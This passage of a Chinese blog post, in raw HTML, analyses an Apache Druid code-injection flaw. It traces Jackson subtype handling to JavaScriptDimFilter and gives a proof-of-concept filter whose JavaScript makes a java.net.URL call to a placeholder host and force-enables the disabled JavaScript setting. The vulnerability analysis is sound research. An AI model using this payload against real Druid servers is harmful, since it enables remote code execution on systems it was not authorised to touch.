class="string">&quot;transformSpec&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;transforms&quot;</span>: [ ], </span><br><span class="line">                <span class="string">&quot;filter&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;and&quot;</span>, </span><br><span class="line">                    <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;selector&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;dimension&quot;</span>: <span class="string">&quot;123&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">                        &#125;, </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;selector&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;dimension&quot;</span>: <span class="string">&quot;123&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;value&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">                        &#125;, </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;selector&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;dimension&quot;</span>: <span class="string">&quot;123&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;value&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;index&quot;</span>, </span><br><span class="line">        <span class="string">&quot;tuningConfig&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;index&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;samplerConfig&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;numRows&quot;</span>: <span class="number">500</span>, </span><br><span class="line">        <span class="string">&quot;timeoutMs&quot;</span>: <span class="number">15000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接在源码中搜索filter类，发现它只是一个接口，没有相关实现，因此搜索其上一级<code>transformSpec</code>，从它的构造方法中可以看出该filter的处理类为DimFilter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonCreator</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformSpec</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;filter&quot;)</span> <span class="keyword">final</span> DimFilter filter,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;transforms&quot;)</span> <span class="keyword">final</span> List&lt;Transform&gt; transforms</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>DimFilter类被添加了JsonTypeInfo和JsonSubTypes注解</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = &quot;type&quot;)</span></span><br><span class="line"><span class="meta">@JsonSubTypes(value = &#123;</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;and&quot;, value = AndDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;or&quot;, value = OrDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;not&quot;, value = NotDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;selector&quot;, value = SelectorDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;columnComparison&quot;, value = ColumnComparisonDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;extraction&quot;, value = ExtractionDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;regex&quot;, value = RegexDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;search&quot;, value = SearchQueryDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;javascript&quot;, value = JavaScriptDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;spatial&quot;, value = SpatialDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;in&quot;, value = InDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;bound&quot;, value = BoundDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;interval&quot;, value = IntervalDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;like&quot;, value = LikeDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;expression&quot;, value = ExpressionDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;true&quot;, value = TrueDimFilter.class),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(name = &quot;false&quot;, value = FalseDimFilter.class)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>

<p>可以看到，name为javascript时，就会使用JavaScriptDimFilter类进行处理，因此只需修改之前json数据中的filter字段中的type为javascript即可，并构造相应的poc即可。再进入JavaScriptDimFilter中，观察其构造函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptDimFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;function&quot;)</span> String function,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="meta">@Nullable</span> ExtractionFn extractionFn,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="meta">@Nullable</span> FilterTuning filterTuning,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> JavaScriptConfig config</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>nullable的可以为空，其他三个参数，第一个没用，第二个为要执行的javascrpit代码，config为一个JavaScriptConfig 对象，只有一个布尔类型的参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonCreator</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptConfig</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;enabled&quot;)</span> <span class="type">boolean</span> enabled</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>因此构造filter字符串如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;filter&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;javascript&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dimension&quot;</span>: <span class="string">&quot;123&quot;</span>, </span><br><span class="line">        <span class="string">&quot;function&quot;</span>: <span class="string">&quot;function(value) &#123;new java.net.URL(\&quot;IP\&quot;).openStream()&#125;&quot;</span>, </span><br><span class="line">        <span class="string">&quot;&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;enabled&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>sink部分调用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.druid.segment.transform.Transformer.transform()</span><br><span class="line"> org.apache.druid.segment.filter.PredicateValueMatcherFactory.matches()</span><br><span class="line">    JavaScriptDimFilter$JavaScriptPredicateFactory.makeStringPredicate()</span><br><span class="line">       JavaScriptDimFilter$JavaScriptPredicateFactory.lambad$makeStringPredicate()</span><br><span class="line">         JavaScriptDimFilter$JavaScriptPredicateFactory.applyObject()</span><br><span class="line">            JavaScriptDimFilter$JavaScriptPredicateFactory.applyInContext()</span><br><span class="line">               Function.call()</span><br></pre></td></tr></table></figure>

<p>这里的函数调用并没有发生在JavaScriptDimFilter的反序列化过程中，反序列化中只进行了function等变量的赋值。javascript类的构造及触发发生在druid的后续处理流程，不过关键函数都还是在JavaScriptDimFilter中。</p>
<p>反序列化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonCreator</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptDimFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;function&quot;)</span> String function,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="meta">@Nullable</span> ExtractionFn extractionFn,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="meta">@Nullable</span> FilterTuning filterTuning,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> JavaScriptConfig config</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">  Preconditions.checkArgument(dimension != <span class="literal">null</span>, <span class="string">&quot;dimension must not be null&quot;</span>);</span><br><span class="line">  Preconditions.checkArgument(function != <span class="literal">null</span>, <span class="string">&quot;function must not be null&quot;</span>);</span><br><span class="line">  <span class="built_in">this</span>.dimension = dimension;</span><br><span class="line">  <span class="built_in">this</span>.function = function;</span><br><span class="line">  <span class="built_in">this</span>.extractionFn = extractionFn;</span><br><span class="line">  <span class="built_in">this</span>.filterTuning = filterTuning;</span><br><span class="line">  <span class="built_in">this</span>.config = config;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>filter实例化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Filter <span class="title function_">toFilter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">JavaScriptPredicateFactory</span> <span class="variable">predicateFactory</span> <span class="operator">=</span> getPredicateFactory();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaScriptFilter</span>(dimension, predicateFactory, filterTuning);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">    String dimension,</span></span><br><span class="line"><span class="params">    JavaScriptDimFilter.JavaScriptPredicateFactory predicate,</span></span><br><span class="line"><span class="params">    FilterTuning filterTuning</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">this</span>.dimension = dimension;</span><br><span class="line">  <span class="built_in">this</span>.predicateFactory = predicate;</span><br><span class="line">  <span class="built_in">this</span>.filterTuning = filterTuning;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> JavaScriptPredicateFactory <span class="title function_">getPredicateFactory</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// JavaScript configuration should be checked when it&#x27;s actually used because someone might still want Druid</span></span><br><span class="line">    <span class="comment">// nodes to be able to deserialize JavaScript-based objects even though JavaScript is disabled.</span></span><br><span class="line">    Preconditions.checkState(config.isEnabled(), <span class="string">&quot;JavaScript is disabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaScriptPredicateFactory</span> <span class="variable">syncedFnPredicateFactory</span> <span class="operator">=</span> predicateFactory;</span><br><span class="line">    <span class="keyword">if</span> (syncedFnPredicateFactory == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (config) &#123;</span><br><span class="line">        syncedFnPredicateFactory = predicateFactory;</span><br><span class="line">        <span class="keyword">if</span> (syncedFnPredicateFactory == <span class="literal">null</span>) &#123;</span><br><span class="line">          syncedFnPredicateFactory = <span class="keyword">new</span> <span class="title class_">JavaScriptPredicateFactory</span>(function, extractionFn);</span><br><span class="line">          predicateFactory = syncedFnPredicateFactory;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> syncedFnPredicateFactory;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptPredicateFactory</span><span class="params">(<span class="keyword">final</span> String script, <span class="keyword">final</span> ExtractionFn extractionFn)</span></span><br><span class="line">    &#123;</span><br><span class="line">      Preconditions.checkNotNull(script, <span class="string">&quot;script must not be null&quot;</span>);</span><br><span class="line">      <span class="built_in">this</span>.script = script;</span><br><span class="line">      <span class="built_in">this</span>.extractionFn = extractionFn;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="type">Context</span> <span class="variable">cx</span> <span class="operator">=</span> Context.enter();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        cx.setOptimizationLevel(<span class="number">9</span>);</span><br><span class="line">        scope = cx.initStandardObjects();</span><br><span class="line"></span><br><span class="line">        fnApply = cx.compileFunction(scope, script, <span class="string">&quot;script&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">        Context.exit();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考及引用"><a href="#参考及引用" class="headerlink" title="参考及引用"></a>参考及引用</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw" title="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg" title="https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg">https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/348944507" title="https://zhuanlan.zhihu.com/p/348944507">https://zhuanlan.zhihu.com/p/348944507</a></p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
